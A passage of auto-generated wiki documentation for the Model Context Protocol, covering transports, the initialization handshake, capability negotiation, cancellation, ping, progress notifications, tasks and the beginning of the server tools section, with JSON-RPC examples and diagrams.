    end
    
    subgraph "Streamable HTTP Transport"
        HC[Client]
        HS[HTTP Server]
        
        HC -->|"POST /mcp<br/>InitializeRequest"| HS
        HS -->|"200 OK + MCP-Session-Id<br/>InitializeResult"| HC
        
        HC -->|"POST /mcp + session<br/>ListToolsRequest"| HS
        HS -->|"text/event-stream<br/>ListToolsResult"| HC
        
        HC -->|"GET /mcp + session<br/>(open listener)"| HS
        HS -->|"text/event-stream<br/>ServerNotifications"| HC
    end
```

**Sources:** [docs/specification/draft/basic/transports.mdx:1-254]()

## Transport Selection Guidelines

| Consideration | stdio | Streamable HTTP |
|--------------|-------|-----------------|
| **Use Case** | Local tools, desktop integrations | Remote services, multi-client servers |
| **Lifecycle** | Bound to client process | Independent server process |
| **Authentication** | Environment variables, process isolation | OAuth 2.1 (see [#3](#3)) |
| **Network** | No network exposure | Requires network configuration |
| **State** | Session exists while subprocess runs | Explicit session management |
| **Bidirectional** | Native via stdin/stdout | Requires SSE streaming |
| **Client Support** | **SHOULD** be supported | Optional |

**Recommendations:**

- Use **stdio** for:
  - Local development tools
  - Desktop application integrations
  - Single-client scenarios
  - Minimal network attack surface

- Use **Streamable HTTP** for:
  - Cloud-hosted services
  - Multi-tenant servers
  - Web-based clients
  - Services requiring complex authentication

**Sources:** [docs/specification/draft/basic/transports.mdx:10-20](), [docs/specification/draft/basic/index.mdx:98-125]()

## Custom Transports

Implementations **MAY** create custom transports following these principles:

1. **Message Format**: Use JSON-RPC 2.0 with UTF-8 encoding
2. **Message Types**: Support `JSONRPCRequest`, `JSONRPCNotification`, `JSONRPCResponse`
3. **Bidirectionality**: Support messages in both directions
4. **Session Management**: Define clear session lifecycle
5. **Error Handling**: Map transport errors to JSON-RPC errors appropriately

Custom transports might include:
- WebSocket-based transports
- gRPC adaptations
- IPC mechanisms (named pipes, Unix domain sockets)
- Message queue systems

**Sources:** [docs/specification/draft/basic/transports.mdx:10-20]()

## Error Handling and Edge Cases

**Transport-Level Errors:**

| Error Condition | stdio | Streamable HTTP |
|----------------|-------|-----------------|
| **Connection Loss** | Process termination | Reconnect with `Last-Event-ID` |
| **Invalid Message** | Log to stderr, continue | HTTP 400 Bad Request |
| **Session Expired** | N/A (subprocess lifecycle) | HTTP 404 Not Found |
| **Origin Violation** | N/A | HTTP 403 Forbidden |
| **Unsupported Method** | N/A | HTTP 405 Method Not Allowed |

**Race Conditions:**

1. **Disconnection during request**: Client **SHOULD** send explicit `CancelledNotification`, not rely on disconnection
2. **Multiple responses**: Server **MUST** send only one response per request ID
3. **Stream closure**: Either party **MAY** close streams, requiring graceful handling

**Sources:** [docs/specification/draft/basic/transports.mdx:76-134](), [docs/specification/draft/basic/utilities/cancellation.mdx:1-87]()

---

# Page: Connection Lifecycle and Capabilities

# Connection Lifecycle and Capabilities

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/CODEOWNERS](.github/CODEOWNERS)
- [docs/specification/2025-06-18/server/prompts.mdx](docs/specification/2025-06-18/server/prompts.mdx)
- [docs/specification/2025-06-18/server/resources.mdx](docs/specification/2025-06-18/server/resources.mdx)
- [docs/specification/2025-06-18/server/tools.mdx](docs/specification/2025-06-18/server/tools.mdx)
- [docs/specification/draft/basic/index.mdx](docs/specification/draft/basic/index.mdx)
- [docs/specification/draft/basic/lifecycle.mdx](docs/specification/draft/basic/lifecycle.mdx)
- [docs/specification/draft/basic/utilities/tasks.mdx](docs/specification/draft/basic/utilities/tasks.mdx)
- [docs/specification/draft/client/elicitation.mdx](docs/specification/draft/client/elicitation.mdx)
- [docs/specification/draft/client/sampling.mdx](docs/specification/draft/client/sampling.mdx)
- [docs/specification/draft/schema.mdx](docs/specification/draft/schema.mdx)
- [docs/specification/draft/server/prompts.mdx](docs/specification/draft/server/prompts.mdx)
- [docs/specification/draft/server/resources.mdx](docs/specification/draft/server/resources.mdx)
- [docs/specification/draft/server/tools.mdx](docs/specification/draft/server/tools.mdx)
- [schema/draft/schema.json](schema/draft/schema.json)
- [schema/draft/schema.ts](schema/draft/schema.ts)

</details>



This document details the Model Context Protocol (MCP) connection lifecycle, including the initialization handshake, negotiation of protocol versions and capabilities, and connection termination. For information on the underlying message system, see [JSON-RPC Message System](#2.2). For details on the transport mechanisms, see [Transport Layer](#2.3).

## Lifecycle Phases

The MCP connection lifecycle is divided into three distinct phases:

1.  **Initialization**: Establishes protocol version compatibility, exchanges and negotiates capabilities, and shares implementation details.
2.  **Operation**: Normal protocol communication occurs based on the negotiated capabilities.
3.  **Shutdown**: Graceful termination of the connection.

The following diagram illustrates the high-level flow of these phases:

```mermaid
sequenceDiagram
    participant Client
    participant Server

    box "Initialization Phase"
        activate Client
        Client->>+Server: "initialize request"
        Server-->>Client: "initialize response"
        Client--)Server: "initialized notification"
    end

    box "Operation Phase"
        note over Client,Server: "Normal protocol operations"
    end

    box "Shutdown Phase"
        Client--)-Server: "Disconnect"
        deactivate Server
        note over Client,Server: "Connection closed"
    end
```

Sources: [docs/specification/draft/basic/lifecycle.mdx:16-36]()

### Initialization Handshake

The initialization phase is the first interaction between an MCP client and server. It is initiated by the client sending an `initialize` request.

#### Client's `initialize` Request

The client sends an `initialize` request to the server. This request includes:

*   The latest protocol version supported by the client.
*   The client's capabilities.
*   Information about the client's implementation.

The structure of this request is defined by the `InitializeRequest` interface [schema/draft/schema.ts:403-407]() and `InitializeRequestParams` interface [schema/draft/schema.ts:387-394]().

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "initialize",
  "params": {
    "protocolVersion": "2025-11-25",
    "capabilities": {
      "roots": {
        "listChanged": true
      },
      "sampling": {},
      "elicitation": {
        "form": {},
        "url": {}
      },
      "tasks": {
        "requests": {
          "elicitation": {
            "create": {}
          },
          "sampling": {
            "createMessage": {}
          }
        }
      }
    },
    "clientInfo": {
      "name": "ExampleClient",
      "title": "Example Client Display Name",
      "version": "1.0.0",
      "description": "An example MCP client application",
      "icons": [
        {
          "src": "https://example.com/icon.png",
          "mimeType": "image/png",
          "sizes": ["48x48"]
        }
      ],
      "websiteUrl": "https://example.com"
    }
  }
}
```

Sources: [docs/specification/draft/basic/lifecycle.mdx:55-98]()

#### Server's `initialize` Response

The server responds to the `initialize` request with its own capabilities and implementation information. The structure of this response is defined by the `InitializeResultResponse` interface [schema/draft/schema.ts:440-448]() and `InitializeResult` interface [schema/draft/schema.ts:417-437]().

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "protocolVersion": "2025-11-25",
    "capabilities": {
      "logging": {},
      "prompts": {
        "listChanged": true
      },
      "resources": {
        "subscribe": true,
        "listChanged": true
      },
      "tools": {
        "listChanged": true
      },
      "tasks": {
        "list": {},
        "cancel": {},
        "requests": {
          "tools": {
            "call": {}
          }
        }
      }
    },
    "serverInfo": {
      "name": "ExampleServer",
      "title": "Example Server Display Name",
      "version": "1.0.0",
      "description": "An example MCP server providing tools and resources",
      "icons": [
        {
          "src": "https://example.com/server-icon.svg",
          "mimeType": "image/svg+xml",
          "sizes": ["any"]
        }
      ],
      "websiteUrl": "https://example.com/server"
    },
    "instructions": "Optional instructions for the client"
  }
}
```

Sources: [docs/specification/draft/basic/lifecycle.mdx:101-145]()

#### Client's `initialized` Notification

After receiving a successful `initialize` response, the client sends an `initialized` notification to indicate it is ready for normal operations. This notification is defined by the `InitializedNotification` interface [schema/draft/schema.ts:458-461]().

```json
{
  "jsonrpc": "2.0",
  "method": "notifications/initialized"
}
```

Sources: [docs/specification/draft/basic/lifecycle.mdx:148-151]()

During the initialization phase:

*   The client SHOULD NOT send requests other than `ping` requests before the server has responded to the `initialize` request.
*   The server SHOULD NOT send requests other than `ping` and `logging` requests before receiving the `initialized` notification.

Sources: [docs/specification/draft/basic/lifecycle.mdx:159-166]()

### Protocol Version Negotiation

The `protocolVersion` field in the `initialize` request and response facilitates version negotiation.

*   The client MUST send the latest protocol version it supports in the `initialize` request.
*   If the server supports the requested version, it MUST respond with the same version.
*   If the server does not support the requested version, it MUST respond with another protocol version it supports, preferably the latest one.
*   If the client does not support the version specified in the server's response, it SHOULD disconnect.

Sources: [docs/specification/draft/basic/lifecycle.mdx:167-178]()

For HTTP-based transports, the negotiated protocol version MUST be included in the `MCP-Protocol-Version` HTTP header on all subsequent requests. For more details, see [Protocol Version Header](#2.3).

### Capability Negotiation

Client and server capabilities define which optional protocol features are available during the session. These capabilities are exchanged within the `capabilities` field of the `initialize` request and response.

The `ClientCapabilities` interface [schema/draft/schema.ts:466-567]() and `ServerCapabilities` interface [schema/draft/schema.ts:573-684]() define the structure of these capabilities.

The following table summarizes key capabilities:

| Category | Capability     | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Client   | `experimental` | Describes support for non-standard experimental features                                 |
| Server   | `prompts`      | Offers [prompt templates](#2.5)                                                          |
| Server   | `resources`    | Provides readable [resources](#2.5)                                                      |
| Server   | `tools`        | Exposes callable [tools](#2.5)                                                           |
| Server   | `logging`      | Emits structured [log messages](/docs/specification/draft/server/utilities/logging)      |
| Server   | `completions`  | Supports argument [autocompletion](/docs/specification/draft/server/utilities/completion) |
| Server   | `tasks`        | Support for [task-augmented](/docs/specification/draft/basic/utilities/tasks) server requests |
| Server   | `extensions`   | Support for optional [extensions](/docs/extensions/overview) beyond the core protocol    |
| Server   | `experimental` | Describes support for non-standard experimental features                                 |

Sources: [docs/specification/draft/basic/lifecycle.mdx:191-208]()

Capability objects can also describe sub-capabilities, such as:

*   `listChanged`: Indicates support for list change notifications (e.g., for prompts, resources, and tools).
*   `subscribe`: Indicates support for subscribing to individual item changes (e.g., for resources).

#### Extension Negotiation

Clients and servers can negotiate support for optional extensions beyond the core protocol. Extensions are advertised in the `extensions` field of capabilities, which is a map of extension identifiers to per-extension settings objects.

Example client capabilities with extensions:

```json
{
  "capabilities": {
    "roots": {},
    "extensions": {
      "io.modelcontextprotocol/apps": {
        "mimeTypes": ["text/html;profile=mcp-app"]
      }
    }
  }
}
```

Example server capabilities with extensions:

```json
{
  "capabilities": {
    "tools": {},
    "extensions": {
      "io.modelcontextprotocol/apps": {}
    }
  }
}
```

Each extension defines the schema of its settings object; an empty object indicates support with no additional settings. If one party supports an extension but the other does not, the supporting party MUST either revert to core protocol behavior or reject the request with an appropriate error. Extensions SHOULD document their expected fallback behavior.

Sources: [docs/specification/draft/basic/lifecycle.mdx:217-251]()

### Operation Phase

During the operation phase, the client and server exchange messages according to the negotiated capabilities. Both parties MUST respect the negotiated protocol version and only use features for which capabilities have been declared.

Sources: [docs/specification/draft/basic/lifecycle.mdx:253-261]()

### Shutdown Phase

The connection can be terminated by either the client or the server. This typically involves closing the underlying transport layer.

## Cancellation

Either the client or the server can send a `notifications/cancelled` notification to indicate that a previously issued request is being cancelled. This notification is defined by the `CancelledNotification` interface [schema/draft/schema.ts:373-376]() and `CancelledNotificationParams` interface [schema/draft/schema.ts:339-354]().

```json
{
  "jsonrpc": "2.0",
  "method": "notifications/cancelled",
  "params": {
    "requestId": 123,
    "reason": "User requested cancellation"
  }
}
```

Sources: [schema/draft/schema.ts:369-371]()

Key considerations for cancellation:

*   The `requestId` in the notification MUST correspond to an ID of a request previously issued in the same direction.
*   This notification is used for cancelling non-task requests. For task cancellation, the `tasks/cancel` request is used instead.
*   A client MUST NOT attempt to cancel its `initialize` request.
*   The notification indicates that the result will be unused, and associated processing SHOULD cease.

Sources: [schema/draft/schema.ts:340-367]()

## Ping

Either the client or the server can send a `ping` request to check if the other party is still alive. The receiver MUST promptly respond with a `ping` result, or else the connection may be disconnected.

The `PingRequest` interface [schema/draft/schema.ts:809-813]() defines the ping request, and `PingResultResponse` interface [schema/draft/schema.ts:822-826]() defines the response.

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "ping"
}
```

Sources: [schema/draft/schema.ts:805-807]()

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {}
}
```

Sources: [schema/draft/schema.ts:817-819]()

## Progress Notifications

The protocol supports out-of-band progress notifications for long-running requests. If a caller requests progress notifications by including a `progressToken` in the `_meta` field of a request, the receiver MAY send `notifications/progress` notifications.

The `ProgressNotification` interface [schema/draft/schema.ts:867-870]() and `ProgressNotificationParams` interface [schema/draft/schema.ts:836-856]() define these notifications.

```json
{
  "jsonrpc": "2.0",
  "method": "notifications/progress",
  "params": {
    "progressToken": "my-progress-token",
    "progress": 50,
    "total": 100,
    "message": "Processing data..."
  }
}
```

Sources: [schema/draft/schema.ts:863-865]()

The `progressToken` from the initial request is used to associate the notification with the ongoing request.

Sources: [schema/draft/schema.ts:837-839]()

## Task System

The Model Context Protocol allows requests to be augmented with tasks, providing a mechanism for long-running operations, polling, and deferred result retrieval. Tasks are uniquely identified by a `taskId`. For a detailed explanation of the task system, refer to [Tasks](/docs/specification/draft/basic/utilities/tasks).

### Task Capabilities

Both clients and servers declare their support for tasks and specific task-augmented operations during initialization.

#### Server Task Capabilities

Servers declare support for tasks via the `ServerCapabilities.tasks` object [schema/draft/schema.ts:648-674]().

| Capability                      | Description                                          |
| :------------------------------ | :--------------------------------------------------- |
| `tasks.list`                    | Server supports the `tasks/list` operation           |
| `tasks.cancel`                  | Server supports the `tasks/cancel` operation         |
| `tasks.requests.tools.call`     | Server supports task-augmented `tools/call` requests |

Sources: [docs/specification/draft/basic/utilities/tasks.mdx:43-48]()

```json
{
  "capabilities": {
    "tasks": {
      "list": {},
      "cancel": {},
      "requests": {
        "tools": {
          "call": {}
        }
      }
    }
  }
}
```

Sources: [docs/specification/draft/basic/utilities/tasks.mdx:49-63]()

#### Client Task Capabilities

Clients declare support for tasks via the `ClientCapabilities.tasks` object [schema/draft/schema.ts:523-560]().

| Capability                              | Description                                                      |
| :-------------------------------------- | :--------------------------------------------------------------- |
| `tasks.list`                            | Client supports the `tasks/list` operation                       |
| `tasks.cancel`                          | Client supports the `tasks/cancel` operation                     |
| `tasks.requests.sampling.createMessage` | Client supports task-augmented `sampling/createMessage` requests |
| `tasks.requests.elicitation.create`     | Client supports task-augmented `elicitation/create` requests     |

Sources: [docs/specification/draft/basic/utilities/tasks.mdx:69-74]()

```json
{
  "capabilities": {
    "tasks": {
      "list": {},
      "cancel": {},
      "requests": {
        "sampling": {
          "createMessage": {}
        },
        "elicitation": {
          "create": {}
        }
      }
    }
  }
}
```

Sources: [docs/specification/draft/basic/utilities/tasks.mdx:76-92]()

### Task Lifecycle Diagram

```mermaid
stateDiagram-v2
    state "Initial State" as InitialState
    state "Working" as Working
    state "Input Required" as InputRequired
    state "Terminal State" as TerminalState

    InitialState --> Working: "Task Creation"
    Working --> InputRequired: "Needs User Input"
    Working --> TerminalState: "Completed/Failed/Cancelled"
    InputRequired --> Working: "Input Provided"
    InputRequired --> TerminalState: "Completed/Failed/Cancelled"
    TerminalState --> InitialState: "Task Deleted (after TTL)"

    state TerminalState {
        state "Completed" as Completed
        state "Failed" as Failed
        state "Cancelled" as Cancelled
    }

    note right of TerminalState
        "Terminal states:"
        "• Completed"
        "• Failed"
        "• Cancelled"
    end note
```

Sources: [docs/specification/draft/basic/utilities/tasks.mdx:413-431]()

---

# Page: Server Features

# Server Features

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/CODEOWNERS](.github/CODEOWNERS)
- [docs/specification/2025-06-18/server/prompts.mdx](docs/specification/2025-06-18/server/prompts.mdx)
- [docs/specification/2025-06-18/server/resources.mdx](docs/specification/2025-06-18/server/resources.mdx)
- [docs/specification/2025-06-18/server/tools.mdx](docs/specification/2025-06-18/server/tools.mdx)
- [docs/specification/draft/basic/index.mdx](docs/specification/draft/basic/index.mdx)
- [docs/specification/draft/basic/lifecycle.mdx](docs/specification/draft/basic/lifecycle.mdx)
- [docs/specification/draft/basic/utilities/tasks.mdx](docs/specification/draft/basic/utilities/tasks.mdx)
- [docs/specification/draft/client/elicitation.mdx](docs/specification/draft/client/elicitation.mdx)
- [docs/specification/draft/client/sampling.mdx](docs/specification/draft/client/sampling.mdx)
- [docs/specification/draft/schema.mdx](docs/specification/draft/schema.mdx)
- [docs/specification/draft/server/prompts.mdx](docs/specification/draft/server/prompts.mdx)
- [docs/specification/draft/server/resources.mdx](docs/specification/draft/server/resources.mdx)
- [docs/specification/draft/server/tools.mdx](docs/specification/draft/server/tools.mdx)
- [schema/draft/schema.json](schema/draft/schema.json)
- [schema/draft/schema.ts](schema/draft/schema.ts)

</details>



This document details the various features and capabilities that Model Context Protocol (MCP) servers can implement. These features enable servers to provide rich contextual information and interactive functionalities to MCP clients. For information on client-side capabilities, see [Client Features](#2.6). For an overview of the core protocol, see [Architecture and Core Concepts](#2.1).

## Overview of Server Capabilities

MCP servers declare their supported features during the [Connection Lifecycle and Capabilities](#2.4) initialization phase. This negotiation ensures that both the client and server operate within a mutually understood set of functionalities.

The primary server features include:

*   **Tools**: Executable functions that allow language models to interact with external systems.
*   **Resources**: URI-addressable data that provides context to language models.
*   **Prompts**: Templates for structured messages and instructions for language models.
*   **Logging**: Mechanisms for servers to send structured log messages to clients.
*   **Completion**: Functionality for providing argument autocompletion suggestions.
*   **Tasks**: Support for long-running, asynchronous operations.

The following diagram illustrates the relationship between these server features and the core protocol layer:

```mermaid
graph TD
    subgraph "MCP Protocol Layer"
        LIFECYCLE["Connection Lifecycle (initialize, initialized)"]
        JSONRPC["JSON-RPC 2.0 Message System"]
    end

    subgraph "Server Features"
        TOOLS["Tools System (tools/list, tools/call)"]
        RESOURCES["Resources System (resources/list, resources/read, resources/templates/list)"]
        PROMPTS["Prompts System (prompts/list, prompts/get)"]
        LOGGING["Logging (notifications/log)"]
        COMPLETION["Completion (completion/complete)"]
        TASKS["Tasks (tasks/list, tasks/get, tasks/result, tasks/cancel)"]
    end

    LIFECYCLE --> JSONRPC
    JSONRPC --> TOOLS
    JSONRPC --> RESOURCES
    JSONRPC --> PROMPTS
    JSONRPC --> LOGGING
    JSONRPC --> COMPLETION
    JSONRPC --> TASKS
```
Sources:
- schema/draft/schema.ts
- docs/specification/draft/basic/lifecycle.mdx
- docs/specification/draft/server/tools.mdx
- docs/specification/draft/server/resources.mdx
- docs/specification/draft/server/prompts.mdx
- docs/specification/draft/basic/utilities/tasks.mdx

## Tools System

The Tools system allows MCP servers to expose executable functions that can be invoked by language models. This enables models to interact with external systems, perform computations, or query data.

### User Interaction Model

Tools are designed to be **model-controlled**. This means that a language model can discover available tools and invoke them automatically based on its understanding of the context and user prompts. However, client applications are encouraged to implement a "human-in-the-loop" mechanism, such as presenting confirmation prompts to the user before executing sensitive operations.

### Capabilities

Servers supporting tools **MUST** declare the `tools` capability during initialization [docs/specification/draft/server/tools.mdx](). The `listChanged` sub-capability indicates whether the server will send notifications when the list of available tools changes.

```json
{
  "capabilities": {
    "tools": {
      "listChanged": true
    }
  }
}
```

### Protocol Messages

#### Listing Tools

Clients discover available tools by sending a `tools/list` request. This operation supports [pagination](#2.5.7).

*   **Request**: `tools/list` ([schema/draft/schema.ts:1600-1603](), `ListToolsRequest`)
*   **Response**: `ListToolsResult` ([schema/draft/schema.ts:1605-1608]()) containing an array of `Tool` objects.

#### Calling Tools

Clients invoke a tool by sending a `tools/call` request.

*   **Request**: `tools/call` ([schema/draft/schema.ts:122-146](), `CallToolRequest`) with the tool's `name` and `arguments`.
